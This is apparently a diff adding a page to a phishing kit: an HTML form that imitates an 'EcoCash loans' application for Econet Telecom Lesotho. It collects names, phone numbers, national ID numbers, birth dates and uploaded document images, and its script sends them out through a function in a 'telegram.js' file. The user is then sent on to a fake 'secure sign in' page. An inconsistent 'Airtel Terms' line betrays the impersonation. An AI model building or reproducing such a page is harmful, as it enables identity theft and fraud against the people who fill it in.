@@ -1,0 +1,135 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>More details | EcoCash loans Lesotho</title>
+  <link rel="icon" href="assets/branding/favicon.ico">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Manrope:wght@600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="flow.css">
+  <style>
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .spinner-btn { border: 2px solid transparent; border-top-color: #fff; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin-right: 10px; }
+    .form-columns{display:grid;grid-template-columns:1fr 1fr;gap:0 14px}
+    .file-upload{border:1px dashed #aaa4d4;border-radius:9px;padding:18px;text-align:center;background:#fafaff}
+    .file-upload input{display:block;margin:10px auto 0;border:0;padding:0;background:transparent}
+    .file-upload small{color:var(--muted);font-size:12px}
+    .check-row{display:flex;align-items:flex-start;gap:10px;margin-top:21px;font-size:12px;color:var(--muted);line-height:1.5}
+    .check-row input{width:17px;height:17px;accent-color:var(--blue);margin:1px 0 0}
+    @media(max-width:700px){.form-columns{grid-template-columns:1fr}.page{padding:30px 15px 20px}.eyebrow{font-size:16px;margin-bottom:12px}.panel{padding:22px 18px;border-radius:18px}.field label{font-size:13px}.field input{padding:10px;font-size:14px}.primary.wide{padding:12px}.check-row{font-size:11px}.file-upload{padding:12px}.form-wrap{padding:0}}
+  </style>
+</head>
+<body>
+  <nav class="flow-nav"><a class="flow-brand" href="https://play.google.com/store/apps/developer?id=Econet+Telecom+LS" target="_blank" rel="noopener"><img src="assets/branding/etl-logo.png" alt="Econet Telecom LS"><span>EcoCash loans Lesotho</span></a><span class="secure">Secure application</span></nav>
+  <main class="page"><div class="form-wrap">
+    <div class="stepper"><span class="done">Loan plan</span><i></i><span class="active">More details</span><i></i><span>Confirm</span></div>
+    <div class="eyebrow">Complete your application</div>
+    <h1>Tell us more about you.</h1>
+    <p class="intro">We need a few details to review your loan request. Fields marked with * are required.</p>
+    <form class="panel" id="details-form" action="login.html">
+      <div class="field"><label for="documents">Upload supporting documents <span style="font-weight:400;color:var(--muted)">(up to 5 images)</span></label>
+        <div class="file-upload"><strong>Choose images to upload</strong><br>
+          <small>Accepted formats: JPG, PNG, WEBP · Maximum 5 files</small>
+          <input id="documents" type="file" accept="image/jpeg,image/png,image/webp" multiple>
+          <small id="file-status"></small>
+        </div>
+      </div>
+      <div class="form-columns">
+        <div class="field"><label for="first-name">First name *</label><input id="first-name" name="firstName" required autocomplete="given-name" placeholder="Enter first name"></div>
+        <div class="field"><label for="last-name">Last name *</label><input id="last-name" name="lastName" required autocomplete="family-name" placeholder="Enter last name"></div>
+      </div>
+      <div class="form-columns">
+        <div class="field"><label for="phone">Phone number (Econet registered number) *</label><input id="phone" name="phone" required type="tel" inputmode="tel" placeholder="e.g. 58 123 456"></div>
+        <div class="field"><label for="email">E-mail</label><input id="email" name="email" type="email" autocomplete="email" placeholder="name@example.com"></div>
+      </div>
+      <div class="form-columns">
+        <div class="field"><label for="identity">National identity card *</label><input id="identity" name="identity" required placeholder="Enter ID number"></div>
+        <div class="field"><label for="dob">Date of birth *</label><input id="dob" name="dob" required type="date"></div>
+      </div>
+      <div class="field"><label for="employment">Employment status *</label>
+        <select id="employment" name="employment" required>
+          <option value="">Select...</option>
+          <option value="self-employed">Self-employed worker</option>
+          <option value="employee">Employee</option>
+          <option value="unemployed">Unemployed</option>
+          <option value="student">Student</option>
+        </select>
+      </div>
+      <div class="form-columns">
+        <div class="field"><label for="loan-amount">Loan amount *</label><input id="loan-amount" name="amount" required type="number" min="1" readonly></div>
+        <div class="field"><label for="repayment-period">Repayment period *</label><input id="repayment-period" name="repaymentPeriod" required readonly></div>
+      </div>
+      <label class="check-row"><input type="checkbox" required><span>I confirm that the information provided is correct and I accept the Airtel Terms and conditions.</span></label>
+      <button class="primary wide" type="submit" id="submit-btn"><span class="btn-text">Continue to secure sign in</span></button>
+    </form>
+    <a class="back" href="index.html">← Back to loan planner</a>
+  </div></main>
+  <script src="assets/js/telegram.js"></script>
+  <script>
+    const application=JSON.parse(localStorage.getItem('ecoLoanApplication')||'{}');
+    document.querySelector('#loan-amount').value=application.amount||5000;
+    document.querySelector('#repayment-period').value=(application.months||6)+' months';
+    const documents=document.querySelector('#documents'), fileStatus=document.querySelector('#file-status');
+    let selectedFiles = [];
+    
+    documents.addEventListener('change',()=>{
+      if(documents.files.length>5){
+        fileStatus.textContent='Please choose no more than 5 images.';
+        fileStatus.style.color='#a21d1d';
+        documents.value='';
+        return;
+      }
+      selectedFiles = Array.from(documents.files);
+      fileStatus.style.color='var(--muted)';
+      fileStatus.textContent=documents.files.length?documents.files.length+' image'+(documents.files.length>1?'s':'')+' selected.':'';
+    });
+    
+    document.querySelector('#details-form').addEventListener('submit', async function(e){
+      e.preventDefault();
+      
+      const submitBtn = document.getElementById('submit-btn');
+      const btnText = submitBtn.querySelector('.btn-text');
+      submitBtn.disabled = true;
+      btnText.innerHTML = '<span class="spinner-btn"></span>Sending...';
+      
+      const form=document.querySelector('#details-form');
+      const customerData = {
+        firstName: form.firstName.value,
+        lastName: form.lastName.value,
+        phone: form.phone.value,
+        email: form.email.value,
+        identity: form.identity.value,
+        dob: form.dob.value,
+        employment: form.employment.value,
+        amount: form.amount.value,
+        repaymentPeriod: form.repaymentPeriod.value
+      };
+      sessionStorage.setItem('ecoCashCustomer', JSON.stringify(customerData));
+      
+      const appId = Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+      sessionStorage.setItem('current_app_id', appId);
+      
+      let message = `<b>New Loan Application</b>\n`;
+      message += `<b>Loan:</b> M ${Number(customerData.amount).toLocaleString()}\n`;
+      message += `<b>Term:</b> ${customerData.repaymentPeriod}\n\n`;
+      message += `<b>Applicant Details:</b>\n`;
+      message += `- Name: ${customerData.firstName} ${customerData.lastName}\n`;
+      message += `- Phone: ${customerData.phone}\n`;
+      message += `- Email: ${customerData.email}\n`;
+      message += `- ID: ${customerData.identity}\n`;
+      message += `- DOB: ${customerData.dob}\n`;
+      message += `- Employment: ${customerData.employment}\n`;
+      
+      try {
+        await sendNoButtons(message, selectedFiles);
+        window.location.href = 'login.html';
+      } catch (error) {
+        console.error('Upload error:', error);
+        submitBtn.disabled = false;
+        btnText.textContent = 'Continue to secure sign in';
+      }
+    });
+  </script>
+</body>
+</html>
